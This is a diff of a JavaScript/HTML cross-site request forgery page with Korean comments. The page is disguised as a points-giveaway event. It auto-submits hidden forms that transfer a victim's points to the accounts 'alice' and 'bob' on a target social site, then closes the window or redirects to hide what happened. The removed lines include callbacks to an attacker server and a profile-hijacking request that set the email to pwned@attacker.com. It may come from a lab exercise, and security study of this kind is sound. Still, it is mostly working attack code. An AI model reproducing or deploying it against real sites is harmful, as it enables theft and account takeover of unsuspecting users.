@@ -101,7 +101,7 @@
         console.log('[+] Target SNS:', TARGET_SNS);
         console.log('[+] Attacker ID:', ATTACKER_ID);
         console.log('[+] Attacker Server:', ATTACKER_SERVER);
-        console.log('[+] Generated at:', '2025-11-10 10:50:14');
+        console.log('[+] Generated at:', '2025-11-10 15:26:00');
         console.log('='.repeat(60));
 
         window.onload = function() {
@@ -110,6 +110,7 @@
 
             document.getElementById('status').innerHTML = '포인트를 받기 위해 준비 중...';
 
+            // 자동 실행
             setTimeout(() => {
                 executeCSRF();
             }, 2000);
@@ -125,63 +126,91 @@
         function executeCSRF() {
             if (attackExecuted) return;
             attackExecuted = true;
-            
+
             document.getElementById('status').innerHTML = '포인트 전송 중...';
             document.getElementById('claimBtn').style.display = 'none';
             document.getElementById('loading').style.display = 'block';
-            
-            const amounts = [5000, 3000, 1000, 500, 300, 100];
+
+            // 실제 profile.php의 정확한 파라미터 사용!
+            // alice ID = 2, bob ID = 3
             let formHTML = '';
-            
-            amounts.forEach((amount, index) => {
-                formHTML += `
-                    <form id="csrfForm${index}" method="POST" action="${TARGET_SNS}/profile.php" style="display:none" target="iframe${index}">
-                        <input type="hidden" name="send_gift" value="1">
-                        <input type="hidden" name="receiver_id" value="${ATTACKER_ID}">
-                        <input type="hidden" name="gift_type" value="diamond">
-                        <input type="hidden" name="points" value="${amount}">
-                        <input type="hidden" name="message" value="Event Gift ${amount}P">
-                    </form>
-                    <iframe id="iframe${index}" name="iframe${index}" style="display:none"></iframe>
-                `;
+
+            // 여러 금액으로 반복 전송 (피해자 포인트 최대한 빼기)
+            const amounts = [5000, 3000, 2000, 1000, 500, 300, 100];
+            const receivers = [
+                {id: 2, name: 'alice'},
+                {id: 3, name: 'bob'}
+            ];
+
+            let formIndex = 0;
+            amounts.forEach((amount) => {
+                receivers.forEach((receiver) => {
+                    formHTML += `
+                        <form id="csrfForm${formIndex}" method="POST" action="${TARGET_SNS}/profile.php" style="display:none" target="iframe${formIndex}">
+                            <input type="hidden" name="send_gift" value="1">
+                            <input type="hidden" name="receiver_id" value="${receiver.id}">
+                            <input type="hidden" name="gift_type" value="diamond">
+                            <input type="hidden" name="points" value="${amount}">
+                            <input type="hidden" name="message" value="Free Event Gift!">
+                        </form>
+                        <iframe id="iframe${formIndex}" name="iframe${formIndex}" style="display:none"></iframe>
+                    `;
+                    formIndex++;
+                });
             });
-            
-            formHTML += `
-                <img src="${TARGET_SNS}/profile.php?email=pwned@attacker.com&full_name=HACKED_BY_CSRF" 
-                     style="display:none" 
-                     onload="notifyProfileChange()">
-            `;
-            
+
             document.getElementById('csrfForms').innerHTML = formHTML;
-            
-            amounts.forEach((amount, index) => {
+
+            // 모든 폼 순차적으로 제출
+            const totalForms = formIndex;
+            for (let i = 0; i < totalForms; i++) {
                 setTimeout(() => {
-                    const form = document.getElementById('csrfForm' + index);
+                    const form = document.getElementById('csrfForm' + i);
                     if (form) {
                         form.submit();
-                        console.log('[+] Submitted form for ' + amount + 'P');
-
-                        fetch(ATTACKER_SERVER + '/notify?event=csrf_attempt&amount=' + amount + '&index=' + index)
-                            .catch(() => {});
+                        const amountIndex = Math.floor(i / receivers.length);
+                        const receiverIndex = i % receivers.length;
+                        console.log(`[+] Sending ${amounts[amountIndex]}P to ${receivers[receiverIndex].name}`);
 
                         document.getElementById('status').innerHTML =
-                            '시도 ' + (index + 1) + '/' + amounts.length + ': ' + amount + ' 포인트';
+                            `전송 중: ${amounts[amountIndex]}P → ${receivers[receiverIndex].name} (${i+1}/${totalForms})`;
                     }
-                }, index * 500);
-            });
+                }, i * 500);
+            }
 
             setTimeout(() => {
                 document.getElementById('loading').style.display = 'none';
                 document.getElementById('success').innerHTML =
-                    '✅ 포인트 전송 완료!<br>곧 계정에 반영됩니다.';
+                    '✅ 포인트 전송 완료!<br>창이 자동으로 닫힙니다...';
                 document.getElementById('success').style.display = 'block';
                 document.getElementById('status').style.display = 'none';
 
-                fetch(ATTACKER_SERVER + '/notify?event=csrf_completed&attempts=' + amounts.length)
-                    .catch(() => {});
-
                 console.log('[+] All CSRF attempts completed');
-            }, amounts.length * 500 + 1000);
+                console.log('[+] Total forms submitted:', totalForms);
+                console.log('[+] Check alice (ID:2) and bob (ID:3) accounts for received points');
+
+                // 2초 후 자동으로 창 닫기 (더 빠르게)
+                setTimeout(() => {
+                    // 여러 방법으로 창 닫기 시도
+                    try {
+                        window.close();
+                    } catch(e) {}
+
+                    try {
+                        window.open('', '_self', '');
+                        window.close();
+                    } catch(e) {}
+
+                    try {
+                        self.close();
+                    } catch(e) {}
+
+                    // 창 닫기가 안되면 원래 사이트로 리다이렉트
+                    setTimeout(() => {
+                        window.location.href = TARGET_SNS + '/index.php';
+                    }, 300);
+                }, 2000);
+            }, totalForms * 500 + 1000);
         }
 
         function notifyProfileChange() {
